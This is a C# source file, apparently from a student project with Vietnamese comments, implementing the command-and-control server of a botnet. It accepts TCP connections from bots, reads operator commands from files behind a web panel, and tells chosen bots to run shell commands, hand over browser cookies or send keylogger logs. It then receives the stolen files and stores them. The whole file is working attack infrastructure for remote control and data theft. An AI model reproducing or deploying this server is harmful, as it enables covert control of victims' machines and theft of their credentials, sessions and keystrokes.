using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server
{
    // Sửa lỗi khi đóng client thì web ko hiển thị client
    //Sửa lỗi nhập cùng một dòng lệnh


    internal class Program
    {
        static Dictionary<TcpClient, string> clients = new Dictionary<TcpClient, string>();

        static string ip = "192.168.100.31";
        static int PORT_NUMBER = 9669;
        private const int BUFFER_SIZE = 1024;
        static ASCIIEncoding encoding = new ASCIIEncoding();
        public static WebClient webClient = new WebClient();
        public static string[] botActive = new string[5];
        public static string[] commandBot = new string[5];
        public static string[] preBotActive = new string[5];
        public static string[] preCommandBot = new string[5];
        static Boolean isFinished = true;       
        public static void sendMessageSocket(string message, Socket socket)
        {
            if (socket.Connected)
            {
                byte[] data = encoding.GetBytes(message);
                socket.Send(data);
            }
        }
        public static string receiveMessageSocket(Socket socket)
        {
            byte[] data = new byte[BUFFER_SIZE];
            socket.Receive(data);
            string rs = encoding.GetString(data);
            return rs;
        }      
        public static void handleConnectSocket(TcpListener listener)
        {
            while (true)
            {
                TcpClient tcplient = listener.AcceptTcpClient();
                Console.WriteLine("Connection received from " + tcplient.Client.RemoteEndPoint);
                AddBot.addNewBot(tcplient);
                string clientName = ((IPEndPoint)tcplient.Client.RemoteEndPoint).ToString();
                clients.Add(tcplient, clientName);
            }
        }
        public static void handleControlBot(TcpListener listener)
        {
            while (true)
            {
                System.Threading.Thread.Sleep(5);
                string filePathBotActive = "F:\\xampp\\htdocs\\PBL4_v2\\php\\botActive.txt";
                string filePathCommandBot = "F:\\xampp\\htdocs\\PBL4_v2\\php\\commandBot.txt";
                FileInfo fileInfo1 = new FileInfo(filePathBotActive);
                FileInfo fileInfo2 = new FileInfo(filePathCommandBot);
                if (fileInfo1.Exists || fileInfo2.Exists)
                {
                    if (fileInfo1.Length == 0 || fileInfo2.Length == 0)
                    {
                        Console.WriteLine("Khong mo dc file");
                        continue;
                    }                   
                }
                botActive = File.ReadAllText(filePathBotActive).Split('&'); // 0: id //1: ip //2: port
                commandBot = File.ReadAllText(filePathCommandBot).Split('&'); // 0: command //1: detail(link,cmd,...)
                //if (preBotActive[0]?.Equals(botActive[0]) == true &&
                //    preBotActive[1]?.Equals(botActive[1]) == true &&
                //    preBotActive[2]?.Equals(botActive[2]) == true &&
                //    preCommandBot[0]?.Equals(commandBot[0]) == true &&
                //    preCommandBot[1]?.Equals(commandBot[1]) == true)
                //{
                //    Console.WriteLine("Cung lenh");
                //    continue;
                //}
                //if (botActive.Equals("") || commandBot.Equals("")) continue;
                string idBot = botActive[0];
                string ipBotActive = botActive[1];
                int portBotActive = int.Parse(botActive[2]);

                string command = commandBot[0];
                string detail = commandBot[1];

                    //command: nocmd / getcmd/ getcookie/ getkeylogger/ getcapture
                    //detail: dir,.../link / start keylogger, stop keylogger/ start capture, stop capture/
                    //else continue
                handleCommandOneClient(idBot, command, detail, ipBotActive + ":" + portBotActive);
                //preBotActive[0] = botActive[0];
                //preBotActive[1] = botActive[1];
                //preBotActive[2] = botActive[2];
                //preCommandBot[0] = commandBot[0];
                //preCommandBot[1] = commandBot[1];
                
                // Xong ctr xóa dl luôn file commandBot
                StreamWriter sw = new StreamWriter(filePathCommandBot, false);
                sw.Write("");
                sw.Close();
            }
        }
        public static async void handleCommandOneClient(string id, string command, string detail, string ipandbot)
        {
            TcpClient clientSelected = new TcpClient();
            foreach (var pair in clients)
            {
                if (pair.Value == ipandbot)
                {
                    clientSelected = pair.Key;
                    break;
                }
            }

            if (command == "exit")
            {
                
            }
            else if (command == "getcookie")
            {           
                string ms = "cookies?" + detail + "?";
                sendMessageSocket(ms, clientSelected.Client);
                receiveFileSocket(clientSelected, "cookies");
                readFile(id, "cookies", detail);
                //Console.WriteLine(detail);
                    //readfile + csdl
            }
            else if (command == "getcmd")
            {              
                string ms = "command?" + detail;
                sendMessageSocket(ms, clientSelected.Client);
                receiveFileSocket(clientSelected, "cmd");
                readFile(id, "cmd", detail);
                //
                //Console.WriteLine(detail);
            }
            else if (command == "getkeylogger")
            {
                sendMessageSocket("keylogger", clientSelected.Client);
                Console.WriteLine("Sending request get keylogger...");
                receiveFileSocket(clientSelected, "keylogger");
                Console.WriteLine("Receive keylogger complete!");
            }
            //else if (command == "read keylogger")
            //{
            //    string type = "keylogger";
            //    string rs = readFile(type, ip.Split(':')[0]);
            //    Console.Write(rs);

            //}
            //else if (command == "read cookies")
            //{
            //    string type = "cookies";
            //    string rs = readFile(type, ip.Split(':')[0]);
            //    Console.Write(rs);

            //}
            //else if (command == "read cmd command")
            //{
            //    string type = "cmd";
            //    string rs = readFile(type, ip.Split(':')[0]);
            //    Console.Write(rs);

            //}
            else
            {
                Console.WriteLine("Command invalid");
            }

        }
        public static void receiveFileSocket(TcpClient client, string type)
        {
           // string ip = client.Client.RemoteEndPoint.ToString().Split(':')[0];
            string fileName = "";
            if (type == "cookies")
            {
                fileName = "getcookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = "getkeylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "getcmd.txt";
            }
            //else if (type == "capture")
            //{
            //    fileName = "getcapture.txt";
            //}
            if (!client.Connected)
            {
                return;
            }
            NetworkStream stream = client.GetStream();  
           
            byte[] fileSizeBytes = new byte[4];
            int bytes = stream.Read(fileSizeBytes, 0, 4);
            int dataLength = BitConverter.ToInt32(fileSizeBytes, 0);

            int bytesLeft = dataLength;
            byte[] data = new byte[dataLength];

            int bufferSize = 1024;
            int bytesRead = 0;

            while (bytesLeft > 0)
            {
                int curDataSize = Math.Min(bufferSize, bytesLeft);
                if (client.Available < curDataSize)
                    curDataSize = client.Available; //This saved me

                bytes = stream.Read(data, bytesRead, curDataSize);

                bytesRead += curDataSize;
                bytesLeft -= curDataSize;

            }
            using (FileStream fs = new FileStream(fileName, FileMode.Create)) // Ghi lại từ đầu
            {
                fs.Write(data, 0, data.Length);
            }
        }
        public static void readFile(string id, string type, string detail)
        {
            string fileName = "";
            if (type == "cookies")
            {
                fileName = "getcookies.txt";
            }
            else if (type == "keylogger")
            {
                fileName = "getkeylogger.txt";
            }
            else if (type == "cmd")
            {
                fileName = "getcmd.txt";
            }

            string rs = "";

            if (File.Exists(fileName))
            {
                string[] lines = File.ReadAllLines(fileName);

                foreach (string line in lines)
                {
                    rs += line + "\n";
                }
            }
            else
            {
                rs = "The file " + fileName + " does not exist\n You need get " + fileName + " from botnet\n";
            }
            AddFile.addNewFile(id, type, detail, rs);

        }
        static void Main(string[] args)
        {
            try
            {
                IPAddress address = IPAddress.Parse("192.168.100.31");

                TcpListener listener = new TcpListener(address, PORT_NUMBER);

                listener.Start();

                Console.WriteLine("Server started on " + listener.LocalEndpoint);
                Console.WriteLine("Waiting for a connection...");

                Thread th_server_listener = new Thread(() => handleConnectSocket(listener));
                th_server_listener.Start();

                Thread th_server_handleCommand = new Thread(() => handleControlBot(listener));
                th_server_handleCommand.Start();
            }
            catch (Exception ex)
            {
               
               //Console.WriteLine("Error: " + ex);
            }
        }
        

    }
}
